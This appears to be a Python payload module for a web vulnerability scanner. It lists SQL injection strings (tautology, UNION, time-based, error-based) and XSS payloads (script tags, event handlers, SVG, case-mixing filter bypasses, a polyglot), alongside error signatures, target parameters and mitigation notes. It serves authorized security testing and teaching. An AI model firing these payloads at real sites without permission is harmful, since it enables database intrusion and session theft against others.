#!/usr/bin/env python3
"""
Web Application Vulnerability Scanner - Payloads
=================================================
Contains test payloads for common web vulnerabilities.

⚠️ ETHICAL USE ONLY - For authorized testing and education
"""

# SQL Injection Test Payloads
# These payloads test for SQL injection vulnerabilities
SQL_INJECTION_PAYLOADS = [
    # Classic SQL injection patterns
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "') OR ('1'='1' --",
    
    # Union-based injection
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION ALL SELECT NULL--",
    
    # Time-based blind SQL injection
    "' AND SLEEP(5)--",
    "' AND 1=1--",
    
    # Boolean-based blind SQL injection
    "' AND '1'='1",
    "' AND '1'='2",
    
    # Error-based injection
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "'||'",
    
    # Second order injection
    "admin'--",
]

# SQL Injection Error Signatures
# Common error messages that indicate SQL injection vulnerability
SQL_ERROR_SIGNATURES = [
    # MySQL errors
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "mysqli_",
    
    # PostgreSQL errors
    "postgresql",
    "pg_query",
    "pg_exec",
    "unterminated quoted string",
    
    # MSSQL errors
    "microsoft sql native client",
    "odbc sql server driver",
    "sqlserver",
    "unclosed quotation mark",
    
    # Oracle errors
    "ora-01756",
    "ora-00933",
    "oracle error",
    
    # Generic SQL errors
    "sql syntax",
    "syntax error",
    "unexpected end of sql command",
    "quoted string not properly terminated",
    "sqlite_error",
    
    # Additional indicators
    "database error",
    "sql error",
    "invalid query",
]

# Cross-Site Scripting (XSS) Test Payloads
# These payloads test for XSS vulnerabilities
XSS_PAYLOADS = [
    # Basic script tags
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    
    # Event handlers
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<iframe onload=alert('XSS')>",
    
    # SVG-based XSS
    "<svg/onload=alert('XSS')>",
    "<svg onload=alert(1)>",
    
    # IMG tag variations
    "<img src='x' onerror='alert(1)'>",
    "<img/src=x onerror=alert('XSS')>",
    
    # Iframe injection
    "<iframe src='javascript:alert(1)'>",
    
    # Mixed case to bypass filters
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<sCrIpT>alert(1)</sCrIpT>",
    
    # No quotes
    "<script>alert(1)</script>",
    
    # With encoded characters
    "<script>alert&#40;1&#41;</script>",
    
    # Polyglot payloads
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</script>",
]

# XSS Detection Signatures
# Indicators that XSS payload was reflected in response
XSS_DETECTION_SIGNATURES = [
    "<script>alert",
    "<script>",
    "onerror=alert",
    "onload=alert",
    "onfocus=alert",
    "<svg",
    "<img",
    "<iframe",
    "javascript:",
]

# Common vulnerable parameters to test
COMMON_VULNERABLE_PARAMS = [
    "q",
    "search",
    "query",
    "keyword",
    "id",
    "user",
    "username",
    "email",
    "name",
    "page",
    "url",
    "redirect",
    "view",
    "file",
    "path",
    "category",
    "item",
    "comment",
    "message",
    "data",
]

# HTTP Headers to test for injection
HEADERS_TO_TEST = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "Cookie",
]

# Payload descriptions for educational purposes
PAYLOAD_DESCRIPTIONS = {
    "sql_injection": {
        "name": "SQL Injection",
        "description": "Attempts to inject SQL code into database queries",
        "impact": "Can lead to unauthorized data access, data modification, or deletion",
        "mitigation": "Use parameterized queries/prepared statements, input validation",
    },
    "xss": {
        "name": "Cross-Site Scripting (XSS)",
        "description": "Injects malicious scripts into web pages viewed by users",
        "impact": "Can steal cookies, session tokens, or redirect users to malicious sites",
        "mitigation": "Encode output, validate input, use Content Security Policy (CSP)",
    },
}


def get_all_payloads():
    """
    Get all payloads organized by vulnerability type.
    
    Returns:
        dict: Dictionary of vulnerability types and their payloads
    """
    return {
        "sql_injection": SQL_INJECTION_PAYLOADS,
        "xss": XSS_PAYLOADS,
    }


def get_error_signatures():
    """
    Get all error signatures organized by vulnerability type.
    
    Returns:
        dict: Dictionary of vulnerability types and their error signatures
    """
    return {
        "sql_injection": SQL_ERROR_SIGNATURES,
        "xss": XSS_DETECTION_SIGNATURES,
    }


if __name__ == "__main__":
    # Display payload statistics when run directly
    print("\n" + "="*60)
    print("WEB VULNERABILITY SCANNER - PAYLOAD DATABASE")
    print("="*60)
    
    print(f"\n[*] SQL Injection Payloads: {len(SQL_INJECTION_PAYLOADS)}")
    print(f"[*] SQL Error Signatures: {len(SQL_ERROR_SIGNATURES)}")
    print(f"[*] XSS Payloads: {len(XSS_PAYLOADS)}")
    print(f"[*] XSS Detection Signatures: {len(XSS_DETECTION_SIGNATURES)}")
    
    print("\n" + "="*60)
    print("VULNERABILITY INFORMATION")
    print("="*60)
    
    for vuln_type, info in PAYLOAD_DESCRIPTIONS.items():
        print(f"\n{info['name']}:")
        print(f"  Description: {info['description']}")
        print(f"  Impact: {info['impact']}")
        print(f"  Mitigation: {info['mitigation']}")
    
    print("\n" + "="*60)
    print("⚠️  Use these payloads responsibly and ethically!")
    print("="*60)
